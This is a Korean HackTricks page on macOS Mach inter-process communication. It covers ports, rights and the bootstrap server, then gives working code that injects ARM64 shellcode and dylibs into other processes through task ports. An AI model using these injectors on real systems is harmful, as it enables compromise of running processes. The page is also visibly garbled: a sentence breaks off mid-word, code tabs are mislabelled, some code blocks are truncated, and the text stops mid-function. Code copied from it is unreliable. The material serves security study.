# macOS IPC - 프로세스 간 통신

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## Mach 메시징을 통한 포트 간 통신

### 기본 정보

Mach는 리소스 공유를 위해 **작업**을 가장 작은 단위로 사용하며, 각 작업은 **여러 개의 스레드**를 포함할 수 있습니다. 이러한 **작업과 스레드는 POSIX 프로세스와 스레드와 1:1로 매핑**됩니다.

작업 간의 통신은 Mach 프로세스 간 통신 (IPC)을 통해 이루어지며, 일방향 통신 채널을 활용합니다. **메시지는 포트 간에 전송**되며, 이는 커널이 관리하는 **메시지 큐처럼 작동**합니다.

각 프로세스에는 **IPC 테이블**이 있으며, 여기에서 **프로세스의 mach 포트**를 찾을 수 있습니다. mach 포트의 이름은 사실상 숫자입니다 (커널 객체에 대한 포인터).

프로세스는 또한 **포트 이름과 함께 일부 권한을 가진 포트를 다른 작업에게 보낼 수 있으며**, 커널은 이를 **다른 작업의 IPC 테이블에 등록**합니다.

### 포트 권한

통신에 필요한 작업이 수행할 수 있는 작업을 정의하는 포트 권한은 이 통신의 핵심입니다. 가능한 **포트 권한**은 ([여기에서 정의된 내용](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **수신 권한**은 포트로 전송된 메시지를 수신할 수 있게 합니다. Mach 포트는 MPSC (다중 생산자, 단일 소비자) 큐이므로 전체 시스템에서 각 포트에 대해 **하나의 수신 권한만 있을 수** 있습니다 (파이프의 경우 여러 프로세스가 하나의 파이프의 읽기 끝에 대한 파일 디스크립터를 모두 보유할 수 있습니다).
* **수신 권한을 가진 작업**은 메시지를 수신하고 **송신 권한을 생성**할 수 있으며, 이를 통해 메시지를 보낼 수 있습니다. 원래는 **자체 작업만 수신 권한**을 가지고 있습니다.
* **송신 권한**은 포트로 메시지를 보낼 수 있게 합니다.
* 송신 권한은 작업이 소유한 송신 권한을 복제하여 **제3의 작업에게 권한을 부여**할 수 있습니다.
* **한 번만 보낼 수 있는 권한**은 포트로 한 번의 메시지를 보낸 후 사라집니다.
* **포트 세트 권한**은 단일 포트가 아닌 _포트 세트_를 나타냅니다. 포트 세트에서 메시지를 디큐하는 것은 해당 포트 중 하나에서 메시지를 디큐합니다. 포트 세트는 Unix의 `select`/`poll`/`epoll`/`kqueue`와 매우 유사하게 여러 포트에서 동시에 수신 대기할 수 있습니다.
* **데드 이름**은 실제 포트 권한이 아니라 플레이스홀더입니다. 포트가 파괴되면 포트에 대한 모든 기존 포트 권한이 데드 이름으로 변환됩니다.

**작업은 송신 권한을 다른 작업에게 전송**하여 메시지를 보낼 수 있습니다. **송신 권한은 복제**될 수 있으므로 작업은 권한을 복제하고 **제3의 작업에게 권한을 부여**할 수 있습니다. 이는 중간 프로세스인 **부트스트랩 서버**와 함께 작업 간의 효과적인 통신을 가능하게 합니다.

### 통신 설정

#### 단계:

통신 채널을 설정하기 위해 **부트스트랩 서버** (**mac의 launchd**)가 관여합니다.

1. 작업 **A**는 **새로운 포트**를 초기화하여 프로세스에서 **수신 권한**을 얻습니다.
2. 수신 권한을 소유한 작업 **A**는 포트에 대한 **송신 권한을 생성**합니다.
3. 작업 **A**는 **부트스트랩 서버**와 **연결**을 설정하며, **포트의 서비스 이름**과 **송신 권한**을 부트스트랩 등록이라는 절차를 통해 제공합니다.
4. 작업 **B**는 서비스 이름에 대한 부트스트랩 **조회**를 수행하기 위해 **부트스트랩 서버**와 상호 작용합니다. 성공적인 경우, 서버는 작업 A로부터 받은 송신 권한을 **복제**하고 **작업 B에게 전송**합니다.
5. 송신 권한을 획득한 후, 작업 **B**는 **메시지를 작성**하고 **작업 A에게 전송**할 수 있습니다.
6. 양방향 통신의 경우 일반적으로 작업 **B**는 **수신 권한**과 **송신 권한을 가진 새로운 포트**를 생성하고, **송신 권한을 작업 A에게 제공**하여 작업 B에게 메시지를 보낼 수 있도록 합니다 (양방향 통신).

부트스트랩 서버는 작업이 주장하는 서비스 이름을 인증할 수 없습니다. 이는 작업이 임의로 **인가 서비스 이름을 주장**하고 모든 요청을 승인할 수 있는 **시스템 작업을 가장할 수 있는** 작업의 잠재적인 가능성을 의미합니다.

그런 다음 Apple은 시스템 제공 서비스의 이름을 **SIP로 보호된** 디렉터리인 `/System/Library/LaunchDaemons` 및 `/System/Library/LaunchAgents`에 있는 안전한 구성 파일에 저장합니다. 부트스트랩 서버는 이러한 각 서비스 이름에 대한 **수신 권한을 생성 및 보유**합니다.

이러한 사전 정의된 서비스에 대해서는 **조회 과정이 약간 다릅니다**. 서비스 이름이 조회되는 경우, launchd는 서비스를 동적으로 시작합니다. 새로운 작업 흐름은 다음과 같습니다:

* 작업 **B**는 서비스 이름에 대한 부트스트랩 **조회**를 시작합니다.
* **launchd**는 작업이 실행 중인지 확인하고 실행 중이 아
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
프로세스는 _**수신 권한**_을 가지고 있으면 Mach 포트에서 메시지를 수신할 수 있습니다. 반대로, **송신자**는 _**송신 권한**_ 또는 _**한 번만 보내기 권한**_을 부여받습니다. 한 번만 보내기 권한은 한 번의 메시지를 보낸 후에 무효화됩니다.

쉬운 **양방향 통신**을 위해 프로세스는 _응답 포트_ (**`msgh_local_port`**)라고 불리는 mach **메시지 헤더**에 mach 포트를 지정할 수 있습니다. 메시지의 **수신자**는 이 메시지에 대한 **응답을 보낼 수 있습니다**. **`msgh_bits`**의 비트 플래그는 이 포트에 대해 **한 번만 보내기 권한**이 파생되고 전송되어야 함을 나타낼 수 있습니다 (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
이러한 양방향 통신은 일반적으로 응답을 기대하는 XPC 메시지에서 사용됩니다 (`xpc_connection_send_message_with_reply` 및 `xpc_connection_send_message_with_reply_sync`). 그러나 일반적으로 양방향 통신을 생성하기 위해 이전에 설명한 대로 **다른 포트가 생성**됩니다.
{% endhint %}

메시지 헤더의 다른 필드는 다음과 같습니다:

* `msgh_size`: 패킷의 전체 크기.
* `msgh_remote_port`: 이 메시지가 전송되는 포트.
* `msgh_voucher_port`: [mach 바우처](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: 수신자에 의해 해석되는 이 메시지의 ID.

{% hint style="danger" %}
**mach 메시지는 mach 포트를 통해 전송**되며, 이는 mach 커널에 내장된 **단일 수신자**, **다중 송신자** 통신 채널입니다. **여러 프로세스**가 mach 포트로 메시지를 **보낼 수 있지만**, 언제든지 **단일 프로세스만** 읽을 수 있습니다.
{% endhint %}

### 포트 열거하기
```bash
lsmp -p <pid>
```
이 도구를 설치하려면 iOS에서 [http://newosxbook.com/tools/binpack64-256.tar.gz ](http://newosxbook.com/tools/binpack64-256.tar.gz)에서 다운로드할 수 있습니다.

### 코드 예시

**sender**가 포트를 할당하고 `org.darlinghq.example` 이름에 대한 **send right**를 생성하여 **부트스트랩 서버**로 보내는 것을 주목하세요. 그리고 수신자는 그 이름에 대한 **send right**를 요청하고 메시지를 보내기 위해 사용했습니다.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/message.h>

#define BUFFER_SIZE 1024

int main(int argc, char *argv[]) {
    mach_port_t server_port;
    kern_return_t kr;
    char buffer[BUFFER_SIZE];

    if (argc != 2) {
        printf("Usage: %s <message>\n", argv[0]);
        exit(1);
    }

    // Connect to the server port
    kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &server_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get server port: %s\n", mach_error_string(kr));
        exit(1);
    }

    // Create a message
    mach_msg_header_t *msg = (mach_msg_header_t *)buffer;
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->msgh_size = sizeof(buffer);
    msg->msgh_remote_port = server_port;
    msg->msgh_local_port = MACH_PORT_NULL;
    msg->msgh_reserved = 0;

    // Set the message type
    msg->msgh_id = 0x12345678;

    // Set the message body
    char *msg_body = buffer + sizeof(mach_msg_header_t);
    strncpy(msg_body, argv[1], BUFFER_SIZE - sizeof(mach_msg_header_t));

    // Send the message
    kr = mach_msg(msg, MACH_SEND_MSG, msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s\n", mach_error_string(kr));
        exit(1);
    }

    printf("Message sent successfully\n");

    return 0;
}
```
{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### 특권 포트

* **호스트 포트**: 이 포트에 대한 **Send** 권한을 가진 프로세스는 **시스템 정보**(예: `host_processor_info`)를 얻을 수 있습니다.
* **호스트 priv 포트**: 이 포트에 대한 **Send** 권한을 가진 프로세스는 커널 확장을 로드하는 등의 **특권 작업**을 수행할 수 있습니다. 이 권한을 얻으려면 **프로세스가 root**여야 합니다.
* 또한, **`kext_request`** API를 호출하려면 다른 **`com.apple.private.kext*`** 권한이 필요하며, 이는 Apple 바이너리에만 부여됩니다.
* **작업 이름 포트**: _작업 포트_의 비특권 버전입니다. 작업을 참조하지만 제어할 수는 없습니다. 이를 통해 사용 가능한 것은 `task_info()`뿐입니다.
* **작업 포트** (또는 커널 포트)**:** 이 포트에 대한 Send 권한을 가지면 작업을 제어할 수 있습니다(메모리 읽기/쓰기, 스레드 생성 등).
* 호출 `mach_task_self()`를 사용하여 호출자 작업에 대한 이 포트의 **이름을 가져옵니다**. 이 포트는 **`exec()`**를 통해만 **상속**됩니다. `fork()`로 생성된 새 작업은 새 작업 포트를 받습니다(특별한 경우로, suid 바이너리에서 `exec()` 후에도 작업은 새 작업 포트를 받습니다). 작업을 생성하고 해당 포트를 얻는 유일한 방법은 `fork()`를 수행하는 동안 ["포트 스왑 댄스"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)를 수행하는 것입니다.
* 이 포트에 액세스하기 위한 제한 사항은 (`AppleMobileFileIntegrity` 바이너리의 `macos_task_policy`에서 가져옴) 다음과 같습니다:
* 앱에 **`com.apple.security.get-task-allow` 권한**이 있는 경우 **동일한 사용자의 프로세스가 작업 포트에 액세스**할 수 있습니다(주로 디버깅을 위해 Xcode에서 추가됩니다). **노타리제이션**(notarization) 프로세스는 이를 제품 릴리스에 허용하지 않습니다.
* **`com.apple.system-task-ports`** 권한이 있는 앱은 커널을 제외한 **모든** 프로세스의 작업 포트를 얻을 수 있습니다. 이전 버전에서는 **`task_for_pid-allow`**로 불렸습니다. 이 권한은 Apple 애플리케이션에만 부여됩니다.
* **루트는** 하드닝된 **런타임이 없는** 애플리케이션의 작업 포트에 액세스할 수 있습니다(및 Apple에서 제공하지 않음).

### 작업 포트를 통한 스레드에 대한 쉘코드 삽입

다음에서 쉘코드를 가져올 수 있습니다:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% tab title="entitlements.plist" %}entitlements.plist 파일은 macOS 애플리케이션의 권한과 특권을 정의하는 XML 파일입니다. 이 파일은 애플리케이션이 특정 시스템 리소스에 접근하거나 특정 작업을 수행할 수 있는 권한을 부여합니다. entitlements.plist 파일은 애플리케이션의 보안 및 권한 상태를 설정하는 데 사용됩니다. 이 파일을 수정하면 애플리케이션의 특정 기능에 대한 액세스 권한을 변경할 수 있습니다. 이는 특권 상승 공격에 사용될 수 있습니다.
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% tabs %}
{% tab title="Objective-C" %}
```objective-c
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach/mach_vm.h>
#import <sys/mman.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        if (argc != 2) {
            printf("Usage: %s <PID>\n", argv[0]);
            return 0;
        }
        
        pid_t target_pid = atoi(argv[1]);
        mach_port_t target_task;
        kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &target_task);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get task for PID %d: %s\n", target_pid, mach_error_string(kr));
            return 0;
        }
        
        const char *shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Task 포트를 통한 스레드 내 Dylib 주입

macOS에서 **스레드**는 **Mach**를 통해 조작되거나 **posix `pthread` API**를 사용하여 조작될 수 있습니다. 이전 주입에서 생성한 스레드는 Mach API를 사용하여 생성되었으므로 **posix 호환되지 않습니다**.

**간단한 쉘코드를 주입**하여 명령을 실행할 수 있었던 이유는 **posix 호환 API와 작업할 필요가 없었기 때문**입니다. Mach만 필요했습니다. **더 복잡한 주입**을 위해서는 스레드도 **posix 호환**이어야 합니다.

따라서, 스레드를 **개선**하기 위해 **`pthread_create_from_mach_thread`**를 호출하여 **유효한 pthread를 생성**해야 합니다. 그런 다음, 이 새로운 pthread는 시스템에서 dylib을 **로드하기 위해 dlopen을 호출**할 수 있으므로 다른 작업을 수행하기 위해 새로운 쉘코드를 작성하는 대신 사용자 정의 라이브러리를 로드할 수 있습니다.

예를 들어, (로그를 생성하고 해당 로그를 청취할 수 있는) **예제 dylib**을 다음에서 찾을 수 있습니다:

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
